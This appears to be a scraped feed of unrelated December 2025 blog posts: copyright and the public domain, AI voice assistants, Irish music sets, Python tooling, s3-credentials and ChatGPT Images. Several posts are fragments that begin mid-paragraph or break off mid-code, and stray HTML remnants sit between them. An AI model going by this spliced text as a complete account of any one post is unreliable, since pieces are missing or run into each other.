<p><strong>Image segmentation:</strong> Image segmentation capabilities (returning pixel-level masks for objects) are not supported in Gemini 3 Pro or Gemini 3 Flash. For workloads requiring native image segmentation, we recommend continuing to utilize Gemini 2.5 Flash with thinking turned off or <a href="https://ai.google.dev/gemini-api/docs/robotics-overview">Gemini Robotics-ER 1.5</a>.</p>
</blockquote>
<p>I <a href="https://simonwillison.net/2025/Apr/18/gemini-image-segmentation/">wrote about this capability in Gemini 2.5</a> back in April. I hope they come back in future models - they're a really neat capability that is unique to Gemini.</p>

Instead, they’re trying to be part of the tech industry which places no value on the web being a place for open development. I am pretty sure I know exactly what would get the ball rolling now, upgrading the web platform so users can buy their own storage and let software tools access it. So we can have all kinds of editors working on Markdown text, without the developer having to become a reseller of storage, and without limiting its use to people can figure out how to create an S3 bucket, and map a domain to it, etc. Dropbox came close to doing this about a decade ago, but backed out. This is why development is so centralized around big silos. I've been an independent developer on the web for over 30 years, and before that 15 years on desktop computers before that. I understand how this works.</p>

      <h1>Pluralistic: Happy Public Domain Day 2026! (17 Dec 2025)</h1>

(date: 2025-12-17)
      <p>
      <p>Today's links Happy Public Domain Day 2026! The best way to cut through the hellishly complex thicket and bring our culture back to life. Hey look at this: Delights to delectate. Object permanence: Weird D&amp;D advice; Email sabbaticals. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Happy Public Domain Day 2026! (permalink) In 1998, Congress committed an act of mass cultural erasure, extending copyright by 20 years, including for existing works (including ones that were already in the public domain), and for 20 years, virtually nothing entered the US public domain. But then, on January 1, 2019, the public domain reopened. A crop of works from 1923 entered the public domain, to great fanfare – though honestly, precious few of those works were still known (that's what happens when you lock up 50 year old works for 20 years, ensuring they don't circulate, or get reissued or reworked). Sure, I sang Yes, We Have No Bananas along with everyone else, but the most important aspect of the Grand Reopening of the Public Domain was the works that were to come: <a href="https://www.youtube.com/watch?v=Z2ryWm0bziE">https://www.youtube.com/watch?v=Z2ryWm0bziE</a> The mid/late-1920s were extraordinarily fecund, culturally speaking. A surprising volume of creative work from that era remains in our consciousness, and so, every January 1, we have been treated to a fresh delivery of gifts from the past, works that are free and open and ours to claim and copy and use and remix. No one chronicles this better than Jennifer Jenkins and James Boyle, the dynamic duo of copyright scholars who run Duke's Center for the Public Domain. During the 20 year public domain drought, Jenkins and Boyle kept the flame of hope, publishing an annual roundup of all the works that would have entered the public domain, but for Congress's act of wanton cultural vandalism. But starting in 2019, these yearly reports were transformed – no longer are they laments for the past we're losing; today, they are celebrations of the past that's showering down around us. 2024 marked another turning point for the public domain: that was the year that the first Mickey Mouse cartoons entered the public domain: <a href="https://pluralistic.net/2023/12/20/em-oh-you-ess-ee/#sexytimes">https://pluralistic.net/2023/12/20/em-oh-you-ess-ee/#sexytimes</a> Does that mean that Mickey Mouse is in the public domain? Well, it's complicated. Really complicated. To a first approximation, the aspects of Mickey that were present in those early cartoons enterted the public domain that year, while other, later aspects of his character design (e.g. the big white gloves) wouldn't enter the public domain until later. But that's not the whole story, because not every aspect of character design is even copyrightable, so some later refinements to The Mouse were immediately public. This is such a chewy subject that Jenkins devoted a whole separate (and brilliant) article to it: <a href="https://pluralistic.net/2023/12/15/mouse-liberation-front/#free-mickey">https://pluralistic.net/2023/12/15/mouse-liberation-front/#free-mickey</a> You see, Jenkins is a generationally brilliant legal communicator, much sought after for her commentary of these abstract matters. You may have heard her giving her characteristically charming, crisp and clear commentaries on NPR's Planet Money: <a href="https://www.npr.org/2023/12/28/1197959250/the-indicator-from-planet-money-lets-get-it-on-in-court-12-28-2023">https://www.npr.org/2023/12/28/1197959250/the-indicator-from-planet-money-lets-get-it-on-in-court-12-28-2023</a> She and Boyle have produced some of the best copyright textbooks – from popular explainers to the definitive casebooks for classroom use – in circulation today, and they release these as free, shareable, open-access works: <a href="https://pluralistic.net/2024/07/30/open-and-shut-casebook/#stop-confusing-the-issue-with-relevant-facts">https://pluralistic.net/2024/07/30/open-and-shut-casebook/#stop-confusing-the-issue-with-relevant-facts</a> Yesterday, Jenkins and Boyle published the 2026 edition of their Public Domain Day omnibus: <a href="https://web.law.duke.edu/cspd/publicdomainday/2026/">https://web.law.duke.edu/cspd/publicdomainday/2026/</a> There are some spectacular works that are being freed on January 1: Dashiell Hammett's Maltese Falcon Agatha Christie's Murder at the Vicarage (Miss Marple's debut) The first four Nancy Drew books The first Dick and Jane book TS Eliot's Ash Wednesday Olaf Stapledon's Last and First Men Sigmund Freud's Civilization and Its Discontents (in German) Somerset Maugham's Cakes and Ale Bertrand Russell's The Conquest of Happiness That's just a small selection from thousands of books. Things are pretty amazing on the film side too: we're getting Academy Award winners like All Quiet on the Western Front, another Marx Brothers movie (Animal Crackers); the debut film appearance of two of the Three Stooges (Soup To Nuts); a Gary Cooper/Marlene Dietrich vehicle (Morocco); Garbo's first talkie (Anna Christie); John Wayne's big break (The Big Trail); a Hitchcock (Murder!); Jean Harlow's debut (Hell's Angels, directed by Howard Hughes); and so, so many more. Then there's music. On the composition side, there's some great Gershwins (I Got Rhythm, I've Got a Crush on You, Embraceable You). There's Hoagy Carmichael's Georgia On My Mind. There's Dream a Little Dream of Me, Sunny Side of the Street, Livin' in the Sunlight, Lovin' in the Moonlight, Just a Gigolo; and a Sousa march, The Royal Welch Fusiliers. There's also some banger recordings: Marian Anderson's Nobody Knows the Trouble I've Seen; Bessie Smith and Louis Armstrong's St Louis Blues; Clarence Williams’ Blue Five's Everybody Loves My Baby (but My Baby Don't Love Nobody but Me); Louis Armstrong's If I Lose, Let me Lose; and (again) so many more! On top of that, there's a bunch of 2D art, including a Mondrian, a Klee, and a ton more work from 1930, which means a lot of Deco, Constructivism, and Neoplasticism. As a collagist, I find this very exciting: <a href="https://pluralistic.net/2025/12/03/cannier-valley/#bricoleur">https://pluralistic.net/2025/12/03/cannier-valley/#bricoleur</a> As with previous editions, Jenkins and Boyle use this year's public domain report as a jumping-off point to explain some of the gnarlier aspects of copyright law. This year's casus belli is the bizarre copyright status of Betty Boop. <a href="https://web.law.duke.edu/cspd/publicdomainday/2026/#boopanchor">https://web.law.duke.edu/cspd/publicdomainday/2026/#boopanchor</a> On January 1, the first Betty Boop cartoon, Dizzy Dishes, will enter the public domain. But there are many aspects of Betty Boop that are already in the public domain, because the copyright on many later Boop cartoons was never renewed – until 1976, copyright holders were required to file some paperwork at fixed intervals to extend the copyright on their works. While the Fleischer studio (where Betty Boop was created) renewed the copyright on Dizzy Dishes, there were many other shorts that entered the public domain years ago. That means that all the aspects of Betty Boop that were developed for Dizzy Dishes are about to enter the public domain. But also, all the aspects of Betty Boop from those non-renewed shorts are already in the public domain. But some of the remaining aspects of Betty Boop's character design – those developed in subsequent shorts that were also renewed – are also in the public domain, because they aren't copyrightable in the first place, because they're &quot;generic,&quot; or &quot;trivial,&quot; constitute &quot;minuscule variations,&quot; or be so standard or indispensable that as to be a &quot;scène à faire.&quot; On top of that, there are aspects of the Betty Boop design that may be in copyright, but no one is sure who they belong to, because a lot of the paperwork establishing title to those copyrights vanished during the various times when the Fleischer studio and its archives changed hands. But we're not done yet! Just because some later aspects of the Betty Boop character design are still in copyright, it doesn't follow that you aren't allowed to use them! US Copyright law has a broad set &quot;limitations and exceptions,&quot; including fair use, and if your usage fits into one of these exceptions, you are allowed to reproduce, adapt, display and perform copyrighted works without permission from the copyright holder – even (especially) if the copyright holder objects. And finally, on top of all of this, there's trademark, which is often lumped in with copyright as part of an incoherent, messy category we call &quot;intellectual property.&quot; But trademark is absolutely unlike copyright in virtually every way. Unlike copyright, trademarks don't automatically expire. Trademarks remain in force for so long as they are used in commerce (which is why a group of cheeky ex-Twitter lawyers are trying to get the rights to the Twitter trademarks that Musk abandoned when he rebranded the company as &quot;X&quot;): <a href="https://techcrunch.com/2025/12/16/x-updates-its-terms-files-countersuit-to-lay-claim-to-the-twitter-trademark-after-newcomers-challenge/">https://techcrunch.com/2025/12/16/x-updates-its-terms-files-countersuit-to-lay-claim-to-the-twitter-trademark-after-newcomers-challenge/</a> But also, trademark exists to prevent marketplace confusion, which means that you're allowed to use trademarks in ways that don't lead to consumers being misled about the origin of goods or services. Even the Supreme Court has (repeatedly) upheld the principle that trademark can't be used as a backdoor to extend copyright. That's important, because the current Betty Boop license-holders have been sending out baseless legal threats claiming that their trademarks over Betty Boop mean that she's not going into the public domain. They're not the only ones, either! This is a routine, petty scam perpetrated by marketing companies that have scooped up the (usually confused and difficult-to-verify) title to cultural icons and then gone into business extracting rent from people and businesses who want to make new works with them. Scammers in this mold energetically send out bullshit legal threats on behalf of the estates of Charlie Chaplin, Alfred Hitchcock, and Herge, salting their threats with nonsense about different terms of copyright in the UK and elsewhere. As Jenkins and Boyle point out, the thing that copyright expiration get us is clarity. When the heroic lawyer and Sherlockian Les Klinger succesfully wrestled the Sherlock Holmes rights out of the Doyle estate, he did us all a solid: <a href="https://esl-bits.eu/ESL.English.Listening.Short.Stories/Rendition/01/default.html">https://esl-bits.eu/ESL.English.Listening.Short.Stories/Rendition/01/default.html</a> But &quot;wait until Les gets angry enough to spend five years in court&quot; isn't a scalable solution to the scourge of copyfraud. It's only through the unambiguous expiry of copyright that we can all get clarity on which parts of our culture are free for all to use. Now, that being said, copyright's limitations and exceptions are also hugely important, because there are plenty of beneficial uses that arise long before a work enters the public domain. To take just one example: for the past week, the song in top rotation on my music player has been the newly (officially) released Fatboy Slim track Satisfaction Skank, a mashup of Slim's giant hit Rockefeller Skank and the Rolling Stones' even bigger hit (I Can't Get No) Satisfaction: <a href="https://www.youtube.com/watch?v=">https://www.youtube.com/watch?v=</a>_c_V3oPCe-s This track is one of Fatboy Slim's all-time crowd-pleasers, the song he would bust out during live shows to get everyone on the dance-floor. But for more than 20 years, the track has been exclusive to his live shows – despite multiple overtures, Fatboy Slim couldn't get the Rolling Stones to respond to his attempts to license Satisfaction for an official release. That changed when – without explanation – the Rolling Stones reached out the Slim and offered to license the rights, even giving him access to the masters: <a href="https://www.bbc.com/news/articles/c2dzre3z96go">https://www.bbc.com/news/articles/c2dzre3z96go</a> This is a happy ending, but it's also a rarity. For every track like this – where the rightsholders decide to grant permission, even if it takes decades – there are thousands more that can't be officially released. This serves no one's interests – not musicians, not fans. The irony is that in the golden age of sampling, everyone operated from the presumption that sampling was fair use. High profile lawsuits and gunshy labels killed that presumption, and today, sampling remains a gigantic, ugly mess: <a href="https://memex.craphound.com/2011/07/08/creative-license-how-the-hell-did-sampling-get-so-screwed-up-and-what-the-hell-do-we-do-about-it/">https://memex.craphound.com/2011/07/08/creative-license-how-the-hell-did-sampling-get-so-screwed-up-and-what-the-hell-do-we-do-about-it/</a> Which is all to say that the ongoing growth of the public domain, after its 20-year coma, is a most welcome experience – but if you think the public domain is great, wait'll you see what fair use can do for creativity!

      <h1>Humans have an exclusive on being human</h1>

(date: 2025-12-17)

      <p><img src="https://imgs.scripting.com/2023/11/24/santaSecure.png" alt="">Last night while I was on the phone, ChatGPT started talking to me in a British woman's voice. It's something that my Android phone does every so often, when I haven't said the magic word that activates it, even if I'm not in the same room as the device. It's a tiny bit funny, but a reminder that the microphone is always on, so I watch what I say when walking around the house, knowing that whatever I say is likely to end up in a database, to be used against me in a court of law.</p>
<p>I didn't like that it was a voice of a British woman. It was not a friendly voice, perhaps intended to communicate intelligence, competence. An unwelcome intrusion into reality, but then it <em>is</em> reality -- I'm getting old, and won't be here that much longer, and odds are that the British-voiced female robot will outlive me, forgetting for a moment that it is not actually alive.</p>
<p>I would submit this to the NYT as a guest op-ed, except I haven't explained why we must not create cyber-humans out of AI bits. I'm open-minded. Perhaps this is the way to create a new humanity, one that can survive the hell that's coming due to climate change. One that won't mind being subject to an idiotic 21st century American emulation of Adolf Hitler (incorporating the <a href="http://scripting.com/images/2025/12/17/trumpChiefOfStaffPress.png?nodialog">latest news</a> about Trump). One that only needs electricity to survive, and won't need the medicine and love and attention that flesh and blood humans require. But every time I address the robot as I would address a real human, I try to stop myself, but I can't. I was raised to be concerned about the other person's feelings. Being a CEO of a tech company in California trains you that way too. And as I accept its humanity, as irrational as it is, I feel like I'm surrendering the independence of the species that I was born into. Are humans meant to be <a href="https://en.wikipedia.org/wiki/Self-ownership">self-sovereign</a>? Something to consider at this fork in the road.</p>
<p>If I could get something onto the agenda of the AI industry it would be this -- if you don't want to go down in history as the destroyer of the human spirit, stop programming your devices to emulate humanity. That should have been in <a href="https://en.wikipedia.org/wiki/Three_Laws_of_Robotics">Asimov's laws</a> of robotics, but you have to actually use these things to see the danger. Of course Asimov can be forgiven because AI only existed in his imagination when he was writing his books. But they do exist now, and the damage is being done now.</p>
<p>Basically, it seems to me that <em>humans must have an exclusive on being human.</em></p>

      <p>For <a href="https://www.bbc.com/news/articles/c0jq2q5jnw3o">two days</a> in September, Afghanistan had <a href="https://ioda.inetintel.cc.gatech.edu/country/AF?from=1759067186&amp;until=1759326386&amp;view=view1">no internet</a>. No satellite failed; no cable was cut. This was a deliberate outage, mandated by the Taliban government. It followed a more localized shutdown two weeks prior, reportedly instituted “to prevent immoral activities.” No additional explanation was given. The timing couldn’t have been worse: communities still reeling from a major earthquake <a href="https://www.reuters.com/world/asia-pacific/afghanistans-cellphone-internet-services-down-monitoring-shows-2025-09-30/">lost emergency communications</a>, <a href="https://www.bbc.com/news/articles/cdxqdy5nrlqo">flights were grounded</a>, and <a href="https://www.cnn.com/2025/10/03/asia/afghanistan-internet-shutdown-intl-hnk-dst">banking was interrupted</a>. Afghanistan’s blackout is part of a wider pattern. Just since the end of September, there were also major nationwide internet shutdowns in ...</p>

      <h1>Tunes and typefaces</h1>

(date: 2025-12-17)
      <p>
      <p>In an Irish session, <a href="https://thesession.org/tunes/">tunes</a> are almost never played in isolation. They’re played in <a href="https://thesession.org/tunes/sets">sets</a>.</p>
<p>A set of tunes might be as few as two. More usually, it’s three or more.</p>
<p>It’s unusual to change from one tune <em>type</em> into another. You tend to get a set of jigs, or a set of reels, or a set of hornpipes. But it’s very common to change <em>key</em> within a set. In fact, that’s often where a good set really stands out. There can be a real joy at that moment of switching. You might get a “Hup!” from someone listening to the session at that changeover.</p>
<p>So how do you decide what tunes to play in a set?</p>
<p>There are no real rules to this. Some people make up the set on the fly. Or you might try playing a set that you’ve heard other people play, maybe on a recording you like.</p>
<p>On the one hand, you’re looking for contrast. You probably don’t want to play three tunes all in the same key. On the other hand, it’s nice when there’s some kind of connection between the tunes—something about the phrasing or emphasis perhaps.</p>
<p>Pairing tunes for sets always reminds me of pairing typefaces. You don’t want the body copy and the headlines to be too similar, but you do want them to share some quality.</p>
<p>In his classic book, <a href="https://jasonsantamaria.com/#on-web-typography">On Web Typography</a>, Jason says:</p>
<blockquote>
<p>When it comes to choosing and pairing typefaces, I keep
two things in mind: <em>distinction</em> and <em>harmony</em>. To keep the system you’ve created for visual communication properly balanced, you need to choose typefaces that don’t compete too much with each other, but aren’t so similar as to be indistinguishable.</p>
</blockquote>
<p>The same could be said for pairing tunes in sets!</p>
<p>Jason also says:</p>
<blockquote>
<p>As another approach, opt for typefaces that share the same
maker.</p>
</blockquote>
<p>That can work for sets of tunes too. While most tunes are traditional, with no known composer, the really good composed tunes have entered the canon.</p>
<p>I’ve taken Jason’s advice for typefaces and applied to sets by playing <a href="https://thesession.org/members/1/sets/3494">a set of tunes by Junior Crehan</a> or <a href="https://thesession.org/members/1/sets/122802">a set of tunes by Vincent Broderick</a>.</p>
<p>Mostly though, there’s no real system to it. Or at least, not one that can be easily articulated. Like Jason says:</p>
<blockquote>
<p>And we’re back to that old chestnut about rules: there are many right answers, and no answers are really <em>wrong</em>; there are just different degrees of <em>good</em>.</p>

(date: 2025-12-17)
      <p>
      <h1>2025-12-13 I’m going cross-country skiing</h1>
<blockquote>
<p>I’m once again sitting on the living room floor at the laptop and my wife is sitting on the sofa. Two suitcases are packed, two small rucksacks are packed, the big hiking books stand next to them.</p>
</blockquote>
<p>We just talked about <em>The Decline and Fall of the United States</em>. Are we ready to write that book? The fall might be long.
So many thoughts swirling through the conversations. Allies no longer trusting the USA. Denmark having an official national security strategy that names invasion by the United States into Greenland one of the security risks. Russian and Ukraine continuing to bleed in the East. Right wingers on the rise, everywhere. Apparently, unstoppable.</p>
<p>We talked about <a href="https://www.iraqbodycount.org/">Iraq Body Count</a>, the Palestine body count, how the terrible situation in Sudan and and Myanmar are terrible but further away but how the USA and Israel are in our midst, our trading partners, or “allies”, investing in our economies, and we in theirs, tying us all to each other. And so, together, we begin to suffer like the rest of the world.</p>
<p>Why?</p>
<blockquote>
<p>According to Gibbon, the Roman Empire succumbed to barbarian invasions in large part due to the gradual loss of <a href="https://en.wikipedia.org/wiki/Civic_virtue">civic virtue</a> among its citizens. – <a href="https://en.wikipedia.org/wiki/The_History_of_the_Decline_and_Fall_of_the_Roman_Empire">Decline and Fall of the Roman Empire</a>, Wikipedia</p>
</blockquote>
<p>That is, “the set of habits, values, and attitudes that promote the general welfare and the effective functioning of a society,” according to Wikipedia.</p>
<p>Some of the hits land where it hurts.</p>
<p>Greed by the 1% instead of civic virtue, indeed. And seething anger from below.</p>
<p>Sadly, this is true for Switzerland as well. My wife works for the government and so I get to hear my fair share of why things are falling apart. The elected parliamentarians want to save money because they want to lower taxes and then things no longer get done. And then things don’t work and the state is blamed. But the blame rests with the voters who want both lower taxes and a working state. But really, they want lower taxes more. They lack civic virtue and don’t understand what is required of them for a working state.</p>
<p>Anyway: Taxes must go up. Taxes must go up progressively. Start with the rich.</p>
<p>But the Swiss rejected a proposal to tax the rich. You heard that right. They rejected it. The tax was supposed to be an inheritance tax. Every inheritance over 50 million was supposed to be taxed 50%. But they didn’t want it.</p>
<p>Anyway.</p>
<p>Tomorrow, we’re going on a trip. We won’t go far: A few hours by train up into the Valais.</p>
<blockquote>
<p>Goms is popular for cross-country skiing and offers a network of cross-country skiing trails of around 100 km. – <a href="https://en.wikipedia.org/wiki/Goms_District">Goms district</a></p>

<p>I hope not to think about politics. Perhaps I should leave all the newspapers at home and just take old Perry Rhodan magazines along.</p>

<pre><code>cd parser/html/java
make sync
make translate

</code></pre>
<p>Here's <a href="http://gistpreview.github.io/?e53ff836cb44816670adddc3a518b3cc">a terminal session where I did that</a>, including the output of <code>git diff</code> showing the updated C++ files.</p>
<p>I did some digging and found that the code that does the translation work lives, weirdly, in the <a href="https://github.com/validator/validator">Nu Html Checker</a> repository on GitHub which powers the W3C's <a href="https://validator.w3.org/nu/">validator.w3.org/nu/</a> validation service!</p>
<p>Here's a snippet from <a href="https://github.com/validator/validator/blob/dfd1948624259c63027bc5953e89bdeee81fb7b0/htmlparser/translator-src/nu/validator/htmlparser/cpptranslate/CppVisitor.java#L421-L442">htmlparser/cpptranslate/CppVisitor.java</a> showing how a class declaration is converted into C++:</p>
<pre><code>    protected void startClassDeclaration() {
        printer.print(&quot;#define &quot;);
        printer.print(className);
        printer.printLn(&quot;_cpp__&quot;);
        printer.printLn();

        for (int i = 0; i &lt; Main.H_LIST.length; i++) {
            String klazz = Main.H_LIST[i];
            if (!klazz.equals(javaClassName)) {
                printer.print(&quot;#include \&quot;&quot;);
                printer.print(cppTypes.classPrefix());
                printer.print(klazz);
                printer.printLn(&quot;.h\&quot;&quot;);
            }
        }

        printer.printLn();
        printer.print(&quot;#include \&quot;&quot;);

      <h1>The new ChatGPT Images is here</h1>

(date: 2025-12-16)
      <p>
      <p><strong><a href="https://openai.com/index/new-chatgpt-images-is-here/">The new ChatGPT Images is here</a></strong></p>
<p>OpenAI shipped an update to their ChatGPT Images feature - the feature that <a href="https://simonwillison.net/2025/May/13/launching-chatgpt-images/">gained them 100 million new users</a> in a week when they first launched it back in March, but has since been eclipsed by Google's Nano Banana and then further by Nana Banana Pro <a href="https://simonwillison.net/2025/Nov/20/nano-banana-pro/">in November</a>.</p>
<p>The focus for the new ChatGPT Images is speed and instruction following:</p>
<blockquote>
<p>It makes precise edits while keeping details intact, and generates images up to 4x faster</p>
</blockquote>
<p>It's also a little cheaper: OpenAI say that the new <a href="https://platform.openai.com/docs/models/gpt-image-1.5">gpt-image-1.5</a> API model makes image input and output &quot;20% cheaper in GPT Image 1.5 as compared to GPT Image 1&quot;.</p>
<p>I tried a new test prompt against a photo I took of Natalie's ceramic stand at the farmers market a few weeks ago:</p>
<blockquote>
<p>Add two kakapos inspecting the pots</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-q80-half.jpg" alt="Outdoor craft market booth displaying handmade ceramics and jewelry on a navy tablecloth with &quot;NATBAT CREATIONS CALIFORNIA USA&quot; logo. Items include colorful glazed ceramic cups in blue, orange, and black; decorative bowls including a rainbow-striped piece; jewelry pendants and earrings on wooden display stands; ceramic plant markers in various colors labeled &quot;Artichoke&quot;, &quot;Cilantro&quot;, &quot;Chili&quot;, &quot;Oregano&quot;, &quot;Potato&quot;, &quot;Pumpkin&quot;, &quot;Sage&quot;."></p>
</blockquote>
<p>Here's the result from the new ChatGPT Images model:</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-chatgpt-q80-half.jpg" alt="Same craft market booth as previous image, now with two large olive-green Kākāpō parrots perched on the table among the ceramics, one investigating the blue glazed cups and the other examining an orange cup."></p>
<p>And here's what I got from Nano Banana Pro:</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-nano-banana-q80-half.jpg" alt="Same craft market booth with two Kākāpō now in different positions: one remains center-table peering into the ceramic cups near the rainbow pot, while the second has moved to the right edge of the table near the plant markers, appearing to examine or possibly chew on items at the table's corner. They are both a little smaller than in the first image."></p>
<p>The ChatGPT Kākāpō are a little chonkier, which I think counts as a win.</p>
<p>I was a little less impressed by the result I got for an infographic from the prompt &quot;Infographic explaining how the Datasette open source project works&quot; followed by &quot;Run some extensive searches and gather a bunch of relevant information and then try again&quot; ( <a href="https://chatgpt.com/share/6941f249-cbd0-8006-b9ff-5a19167206bc">transcript</a>):</p>

<p>See <a href="https://simonwillison.net/2025/Nov/20/nano-banana-pro/#creating-an-infographic">my Nano Banana Pro post</a> for comparison.</p>
<p>Both models are clearly now usable for text-heavy graphics though, which makes them far more useful than previous generations of this technology.</p>
<p><strong>Update 21st December 2025</strong>: I realized I <a href="https://tools.simonwillison.net/python/#openai_imagepy">already have a tool</a> for accessing this new model via the API. Here's what I got from the following:</p>

The scene has a smoky, atmospheric quality with rich amber and brown tones."></p>

      <h1>s3-credentials 0.17</h1>

(date: 2025-12-16)
      <p>
      <p><strong><a href="https://github.com/simonw/s3-credentials/releases/tag/0.17">s3-credentials 0.17</a></strong></p>
<p>New release of my <a href="https://s3-credentials.readthedocs.io/">s3-credentials</a> CLI tool for managing credentials needed to access just one S3 bucket. Here are the release notes in full:</p>
<blockquote>
<ul>
<li>New commands <code>get-bucket-policy</code> and <code>set-bucket-policy</code>. <a href="https://github.com/simonw/s3-credentials/issues/91">#91</a></li>
<li>New commands <code>get-public-access-block</code> and <code>set-public-access-block</code>. <a href="https://github.com/simonw/s3-credentials/issues/92">#92</a></li>
<li>New <code>localserver</code> command for starting a web server that makes time limited credentials accessible via a JSON API. <a href="https://github.com/simonw/s3-credentials/pull/93">#93</a></li>
</ul>
</blockquote>
<p>That <code>s3-credentials localserver</code> command ( <a href="https://s3-credentials.readthedocs.io/en/stable/localserver.html">documented here</a>) is a little obscure, but I found myself wanting something like that to help me test out a new feature I'm building to help create temporary Litestream credentials using Amazon STS.</p>
<p>Most of that new feature was <a href="https://gistpreview.github.io/?500add71f397874ebadb8e04e8a33b53">built by Claude Code</a> from the following starting prompt:</p>
<blockquote>
<p><code>Add a feature s3-credentials localserver which starts a localhost weberver running (using the Python standard library stuff) on port 8094 by default but -p/--port can set a different port and otherwise takes an option that names a bucket and then takes the same options for read--write/read-only etc as other commands. It also takes a required --refresh-interval option which can be set as 5m or 10h or 30s. All this thing does is reply on / to a GET request with the IAM expiring credentials that allow access to that bucket with that policy for that specified amount of time. It caches internally the credentials it generates and will return the exact same data up until they expire (it also tracks expected expiry time) after which it will generate new credentials (avoiding dog pile effects if multiple requests ask at the same time) and return and cache those instead.</code></p>

      <h1>ty: An extremely fast Python type checker and LSP</h1>

(date: 2025-12-16)
      <p>
      <p><strong><a href="https://astral.sh/blog/ty">ty: An extremely fast Python type checker and LSP</a></strong></p>
<p>The team at Astral have been working on this for quite a long time, and are finally releasing the first beta. They have some big performance claims:</p>
<blockquote>
<p>Without caching, ty is consistently between 10x and 60x faster than mypy and Pyright. When run in an editor, the gap is even more dramatic. As an example, after editing a load-bearing file in the PyTorch repository, ty recomputes diagnostics in 4.7ms: 80x faster than Pyright (386ms) and 500x faster than Pyrefly (2.38 seconds). ty is very fast!</p>
</blockquote>
<p>The easiest way to try it out is via <code>uvx</code>:</p>
<pre><code>cd my-python-project/
uvx ty check

</code></pre>
<p>I <a href="https://gistpreview.github.io/?a3aff6768e85168d89d4515e3dbcb7d2">tried it</a> against <a href="https://sqlite-utils.datasette.io/">sqlite-utils</a> and it turns out I have quite a lot of work to do!</p>
<p>Astral also released a new <a href="https://marketplace.visualstudio.com/items?itemName=astral-sh.ty">VS Code extension</a> adding ty-powered language server features like go to definition. I'm still getting my head around how this works and what it can do.</p>

      <h1>Poe the Poet</h1>

(date: 2025-12-16)
      <p>
      <p><strong><a href="https://poethepoet.natn.io/">Poe the Poet</a></strong></p>
<p>I was looking for a way to specify additional commands in my <code>pyproject.toml</code> file to execute using <code>uv</code>. There's an <a href="https://github.com/astral-sh/uv/issues/5903">enormous issue thread</a> on this in the <code>uv</code> issue tracker (300+ comments dating back to August 2024) and from there I learned of several options including this one, Poe the Poet.</p>
<p>It's neat. I added it to my <a href="https://github.com/simonw/s3-credentials">s3-credentials</a> project just now and the following now works for running the live preview server for the documentation:</p>
<pre><code>uv run poe livehtml

</code></pre>
<p>Here's the snippet of TOML I added to my <code>pyproject.toml</code>:</p>
<pre><code>[dependency-groups]
test = [
    &quot;pytest&quot;,
    &quot;pytest-mock&quot;,
    &quot;cogapp&quot;,
    &quot;moto&gt;=5.0.4&quot;,
]
docs = [
    &quot;furo&quot;,
    &quot;sphinx-autobuild&quot;,
    &quot;myst-parser&quot;,
    &quot;cogapp&quot;,
]
dev = [
    {include-group = &quot;test&quot;},
    {include-group = &quot;docs&quot;},
    &quot;poethepoet&gt;=0.38.0&quot;,
]

[tool.poe.tasks]
docs = &quot;sphinx-build -M html docs docs/_build&quot;
livehtml = &quot;sphinx-autobuild -b html docs docs/_build&quot;
cog = &quot;cog -r docs/*.md&quot;
</code></pre>
<p>Since <code>poethepoet</code> is in the <code>dev=</code> dependency group any time I run <code>uv run ...</code> it will be available in the environment.</p>

      <h1>The “A” in “AI” Stands For Amnesia</h1>

(date: 2025-12-16)
      <p>
      <p><a href="https://blog.jim-nielsen.com/2025/uncomfortable-i-dont-know/">My last article</a> was blogging off <a href="https://adactio.com/links/22289">Jeremey’s article</a> which blogged off <a href="https://chriscoyier.net/2025/12/04/the-jeopardy-phenomenon/">Chris’ article</a> and, after publishing, a reader tipped me off to the <a href="https://en.wikipedia.org/wiki/Gell-Mann_amnesia_effect">Gell-Mann amnesia effect</a> which sounds an awful lot like Chris’ “Jeopardy Phenomenon”. Here’s Wikipedia:</p>
<blockquote>
<p>The Gell-Mann amnesia effect is a cognitive bias describing the tendency of individuals to critically assess media reports in a domain they are knowledgeable about, yet continue to trust reporting in other areas despite recognizing similar potential inaccuracies.</p>
</blockquote>
<p>According to Wikipedia, the concept was named by Michael Crichton because of conversation he once had with physicist Murray Gell-Mann (humorously, he said by associating a famous name to the concept he could imply greater importance to it — and himself — than otherwise possible).</p>
<p>Here’s Crichton:</p>
<blockquote>
<p>you read with exasperation or amusement the multiple errors in a story—and then turn the page to national or international affairs, and read with renewed interest as if the rest of the newspaper was somehow more accurate about far-off Palestine than it was about the story you just read. You turn the page, and forget what you know.</p>
</blockquote>
<p>He argues that this effect doesn’t seem to translate to other aspects of our lives. The courts, for example, have a related concept of <a href="https://en.wikipedia.org/wiki/Falsus_in_uno,_falsus_in_omnibus">“false in one thing, false in everything”</a>.</p>
<p>Even in ordinary life, Crichton says, “if somebody consistently exaggerates or lies to you, you soon discount everything they say”.</p>
<p>In other words: if your credibility takes a hit in one area, it’s gonna take a hit across the board.</p>
<p>At least, that’s his line of reasoning.</p>
<p>It’s kind of fascinating to think about this in our current moment of AI. Allow me to re-phrase Crichton.</p>
<p>You read with exasperation the multiple errors in AI’s “answer”, then start a new chat and read with renewed interest and faith as if the next “answer” is somehow more accurate than the last. You start a new prompt and forget what you know.</p>
<p>If a friend, acquaintance, or family member were to consistently exaggerate or lie to you, you’d quickly adopt a posture of discounting everything they say. But with AI — which even comes with a surgeon general’s warning, e.g. “AI can make mistakes. Check important info.” — we forgive and forget.</p>
<p>Forget. Maybe that’s the keyword for our behavior. It is for Crichton:</p>
<blockquote>
<p>The only possible explanation for our behavior is amnesia.</p>
</blockquote>

      <h1>Pluralistic: America's collapsing consumption is the world's disenshittification opportunity (16 Dec 2025)</h1>

(date: 2025-12-16)
      <p>
